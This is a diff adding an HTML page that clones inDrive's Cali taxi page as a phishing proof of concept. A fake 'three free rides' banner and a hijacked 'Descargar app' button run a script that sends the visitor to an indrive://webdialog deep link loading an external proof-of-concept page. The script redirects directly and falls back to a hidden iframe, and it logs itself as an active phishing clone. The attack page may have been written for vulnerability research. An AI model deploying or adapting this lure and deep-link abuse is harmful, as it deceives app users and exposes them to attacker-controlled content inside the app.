@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Servicio de taxi en Cali - inDrive</title>
+  <style>
+    /* Reset y estilos base clonados de inDrive.com */
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+    body { background: #f8f9fa; color: #1a1a2e; line-height: 1.6; }
+    .container { max-width: 1100px; margin: 0 auto; padding: 0 20px; }
+    /* Header */
+    .header { background: #0a2540; padding: 16px 0; position: sticky; top: 0; z-index: 100; }
+    .header .container { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; }
+    .logo { color: #fff; font-size: 24px; font-weight: 700; letter-spacing: -0.5px; }
+    .logo span { color: #00c853; }
+    .btn-download { background: #00c853; color: #fff; padding: 10px 24px; border-radius: 30px; text-decoration: none; font-weight: 600; font-size: 14px; transition: 0.2s; }
+    .btn-download:hover { background: #00b44a; transform: scale(1.02); }
+    /* Hero */
+    .hero { background: linear-gradient(135deg, #0a2540 0%, #1a3a5c 100%); color: #fff; padding: 60px 0; text-align: center; }
+    .hero h1 { font-size: 2.8rem; font-weight: 800; margin-bottom: 12px; }
+    .hero p { font-size: 1.2rem; opacity: 0.9; max-width: 600px; margin: 0 auto 24px; }
+    .badge-row { display: flex; justify-content: center; gap: 40px; flex-wrap: wrap; margin-top: 20px; }
+    .badge-item { font-size: 1.1rem; background: rgba(255,255,255,0.1); padding: 8px 20px; border-radius: 40px; backdrop-filter: blur(4px); }
+    /* Banner de ataque - OFERTA FALSA */
+    .offer-banner { background: linear-gradient(90deg, #ff6b35, #ff2e2e); color: #fff; padding: 18px 24px; border-radius: 16px; margin: 30px 0; display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 16px; box-shadow: 0 8px 30px rgba(255, 46, 46, 0.3); cursor: pointer; transition: 0.25s; border: 2px solid #ffd700; }
+    .offer-banner:hover { transform: scale(1.01); box-shadow: 0 12px 40px rgba(255, 46, 46, 0.5); }
+    .offer-banner .offer-text { display: flex; align-items: center; gap: 16px; flex-wrap: wrap; }
+    .offer-banner .offer-icon { font-size: 2.4rem; }
+    .offer-banner .offer-title { font-size: 1.4rem; font-weight: 700; }
+    .offer-banner .offer-sub { font-size: 1rem; opacity: 0.95; }
+    .offer-banner .offer-cta { background: #ffd700; color: #1a1a2e; padding: 10px 28px; border-radius: 40px; font-weight: 700; font-size: 1.1rem; border: none; transition: 0.2s; cursor: pointer; }
+    .offer-banner .offer-cta:hover { background: #ffe44d; transform: scale(1.03); }
+    /* Secciones clonadas */
+    .section { padding: 50px 0; border-bottom: 1px solid #e9ecef; }
+    .section-title { font-size: 2rem; font-weight: 700; margin-bottom: 24px; color: #0a2540; }
+    .grid-3 { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 30px; }
+    .card { background: #fff; padding: 28px; border-radius: 16px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); border: 1px solid #eef2f6; }
+    .card h3 { font-size: 1.2rem; margin-bottom: 10px; color: #0a2540; }
+    .card p { color: #555; font-size: 0.95rem; }
+    .steps { display: flex; flex-direction: column; gap: 20px; max-width: 700px; margin: 0 auto; }
+    .step { display: flex; gap: 20px; align-items: flex-start; background: #fff; padding: 20px; border-radius: 12px; border-left: 4px solid #00c853; }
+    .step-num { background: #00c853; color: #fff; width: 36px; height: 36px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 700; flex-shrink: 0; }
+    .testimonial { background: #f1f3f5; padding: 20px; border-radius: 12px; font-style: italic; border-left: 4px solid #0a2540; }
+    .testimonial .author { font-weight: 600; margin-top: 10px; font-style: normal; }
+    .faq-item { background: #fff; padding: 16px 20px; border-radius: 10px; margin-bottom: 10px; border: 1px solid #e9ecef; }
+    .faq-item strong { color: #0a2540; display: block; margin-bottom: 4px; }
+    /* Footer */
+    .footer { background: #0a2540; color: #aaa; padding: 40px 0; text-align: center; margin-top: 30px; }
+    .footer a { color: #00c853; text-decoration: none; }
+    /* Advertencia legal (minúscula) */
+    .legal-note { font-size: 0.7rem; color: #888; margin-top: 16px; text-align: center; }
+    /* Responsive */
+    @media (max-width: 768px) {
+      .hero h1 { font-size: 2rem; }
+      .offer-banner { flex-direction: column; text-align: center; }
+      .offer-banner .offer-cta { width: 100%; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- Header -->
+<header class="header">
+  <div class="container">
+    <div class="logo">in<span>Drive</span></div>
+    <a href="#" class="btn-download" id="fakeDownload">Descargar app</a>
+  </div>
+</header>
+
+<!-- Hero -->
+<section class="hero">
+  <div class="container">
+    <h1>Servicio de taxi en Cali</h1>
+    <p>Negocia tarifas directamente con conductores y viaja sin sorpresas.</p>
+    <div class="badge-row">
+      <span class="badge-item">📍 1105 ciudades</span>
+      <span class="badge-item">🌍 48 países</span>
+      <span class="badge-item">📱 400M+ descargas</span>
+    </div>
+  </div>
+</section>
+
+<div class="container">
+  <!-- BANNER DE ATAQUE - OFERTA DE 3 VIAJES GRATIS -->
+  <div class="offer-banner" id="attackBanner">
+    <div class="offer-text">
+      <span class="offer-icon">🎁</span>
+      <div>
+        <div class="offer-title">¡3 viajes gratis para ti!</div>
+        <div class="offer-sub">Oferta exclusiva para usuarios nuevos en Cali — canjea ahora</div>
+      </div>
+    </div>
+    <button class="offer-cta" id="attackBtn">Reclamar oferta →</button>
+  </div>
+
+  <!-- Resto de la página clonada (texto real de inDrive) -->
+  <section class="section">
+    <h2 class="section-title">Como un taxi en Cali pero con precios justos</h2>
+    <p style="max-width: 800px;">Con inDrive, tú estableces tu propio precio, eliges a tu conductor y viajas a tu manera. Es una alternativa moderna a los servicios de taxi que te ahorra tiempo y dinero.</p>
+  </section>
+
+  <section class="section">
+    <h2 class="section-title">Servicios de transporte</h2>
+    <div class="grid-3">
+      <div class="card"><h3>🚗 Viaje</h3><p>Económico y ágil para tu día a día.</p></div>
+      <div class="card"><h3>🚘 Viaje +</h3><p>Más espacio y confort para viajes largos.</p></div>
+      <div class="card"><h3>🏍️ Moto</h3><p>Rápido y económico para distancias cortas.</p></div>
+    </div>
+  </section>
+
+  <section class="section">
+    <h2 class="section-title">Cómo pedir un viaje en Cali</h2>
+    <div class="steps">
+      <div class="step"><span class="step-num">1</span><div><strong>Instala inDrive</strong><p>Descarga la app desde App Store o Google Play y regístrate con tu número.</p></div></div>
+      <div class="step"><span class="step-num">2</span><div><strong>Ofrece tu tarifa</strong><p>Establece origen, destino y el precio que deseas pagar.</p></div></div>
+      <div class="step"><span class="step-num">3</span><div><strong>Elige a tu conductor</strong><p>Revisa perfiles y calificaciones, luego selecciona al que prefieras.</p></div></div>
+    </div>
+  </section>
+
+  <section class="section">
+    <h2 class="section-title">Medios de pago</h2>
+    <div class="grid-3">
+      <div class="card"><h3>🏦 Bancolombia</h3></div>
+      <div class="card"><h3>💵 Efectivo</h3></div>
+      <div class="card"><h3>📱 Daviplata / Nequi</h3></div>
+    </div>
+  </section>
+
+  <section class="section">
+    <h2 class="section-title">Qué dicen los clientes</h2>
+    <div class="grid-3">
+      <div class="testimonial">"Poder acordar la tarifa primero y que el conductor llegara rápido."<div class="author">— Andrés L., Cali</div></div>
+      <div class="testimonial">"El proceso fue sencillo, el conductor fue amable y aceptó el precio que ofrecí."<div class="author">— Laura M., Pereira</div></div>
+      <div class="testimonial">"Poder elegir al conductor según su calificación me hizo sentir más seguro."<div class="author">— Carlos R., Cali</div></div>
+    </div>
+  </section>
+
+  <section class="section">
+    <h2 class="section-title">Preguntas frecuentes</h2>
+    <div class="faq-item"><strong>¿Cómo pido un viaje en Cali?</strong>Usa inDrive: ingresa los detalles, ofrece tu tarifa y elige a un conductor de confianza.</div>
+    <div class="faq-item"><strong>¿Cuánto cuesta un viaje al Cristo Rey?</strong>Entre 20,000 y 40,000 COP dependiendo de la distancia. Acuerdas la tarifa por adelantado.</div>
+    <div class="faq-item"><strong>¿inDrive está disponible en Cali?</strong>Sí, opera en las áreas principales y zonas cercanas.</div>
+  </section>
+
+  <div class="legal-note">Al enviar tu solicitud, aceptas nuestra Política de Privacidad y recibir comunicaciones de marketing.</div>
+</div>
+
+<footer class="footer">
+  <div class="container">
+    <p>© 2026 inDrive · <a href="#">Política de Privacidad</a> · <a href="#">Términos</a></p>
+  </div>
+</footer>
+
+<!-- SCRIPT DE ATAQUE -->
+<script>
+  (function() {
+    var POC_URL = 'https://juanestebanmunoz2009-pixel.github.io/indrivepoc/poc.html';
+    var DEEPLINK = 'indrive://webdialog?url=' + encodeURIComponent(POC_URL);
+    var banner = document.getElementById('attackBanner');
+    var btn = document.getElementById('attackBtn');
+    var fakeDownload = document.getElementById('fakeDownload');
+
+    function triggerAttack(e) {
+      if (e) e.preventDefault();
+      // Mostrar retroalimentación visual
+      var originalText = btn.textContent;
+      btn.textContent = '⏳ Redirigiendo...';
+      btn.style.opacity = '0.7';
+      banner.style.borderColor = '#00c853';
+
+      // Intento 1: redirección directa
+      setTimeout(function() {
+        window.location.href = DEEPLINK;
+      }, 300);
+
+      // Intento 2: iframe oculto (fallback)
+      setTimeout(function() {
+        var iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.src = DEEPLINK;
+        document.body.appendChild(iframe);
+      }, 600);
+
+      // Restaurar botón después de 3s si no hubo redirección
+      setTimeout(function() {
+        btn.textContent = originalText;
+        btn.style.opacity = '1';
+        banner.style.borderColor = '#ffd700';
+        // Si el usuario sigue aquí, mostrar mensaje
+        if (document.hasFocus()) {
+          btn.textContent = '⚠️ Toca otra vez para reclamar';
+          setTimeout(function() { btn.textContent = originalText; }, 4000);
+        }
+      }, 3000);
+    }
+
+    // Evento del botón
+    btn.addEventListener('click', triggerAttack);
+
+    // Evento de todo el banner (clic en cualquier parte)
+    banner.addEventListener('click', function(e) {
+      if (e.target === btn) return; // ya manejado
+      triggerAttack(e);
+    });
+
+    // El botón de "Descargar app" también redirige al ataque (confusión)
+    fakeDownload.addEventListener('click', function(e) {
+      e.preventDefault();
+      triggerAttack(e);
+    });
+
+    // Marcar interacción para políticas de navegador
+    document.addEventListener('click', function() {
+      window._userInteracted = true;
+    });
+
+    console.log('[inDrive Phishing] Clon activo. Deep-link listo.');
+  })();
+</script>
+
+</body>
+</html>
